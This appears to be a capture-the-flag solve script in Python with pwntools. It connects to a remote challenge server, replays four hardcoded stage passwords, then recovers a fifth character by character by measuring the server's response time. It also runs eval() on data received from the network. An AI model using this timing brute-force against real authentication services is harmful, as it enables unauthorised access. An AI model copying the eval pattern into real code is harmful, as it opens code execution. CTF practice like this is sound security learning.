import string
from pwn import *
context.log_level='critical'

stage1 = 'sloppytoppywithatwist'
stage2 = 'gingerdangerhermoinegranger'
stage3 = 'hickerydickerydockskibididobdobpop'
stage4 = 'snickersnortsupersecureshortshakingsafarisadistic'
stage5 = 'boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartpoop'
flag = ''
candi = [0, flag]
while True:
    for c in string.ascii_lowercase: #string.printable.strip():
        print(f'cur : {flag + c}, (candi : {candi[1]})')
        p = remote('20.244.33.146', 4445)
        p.sendlineafter(b'Enter password:', stage1.encode())
        p.sendlineafter(b'Enter password:', stage2.encode())
        p.sendlineafter(b'Enter password:', stage3.encode())
        p.sendlineafter(b'Enter password:', stage4.encode())
        p.sendlineafter(b'Enter password:', (flag+c).encode())
        p.recvuntil(b'Time taken:  ')
        res = eval(p.recvline())
        p.close()
        print(res)

        if res > candi[0] + 0.001:
            candi[0] = res
            candi[1] = flag + c
            print(f'updated : {candi[1]}')
            break

    print('[+]', candi)
    flag = candi[1]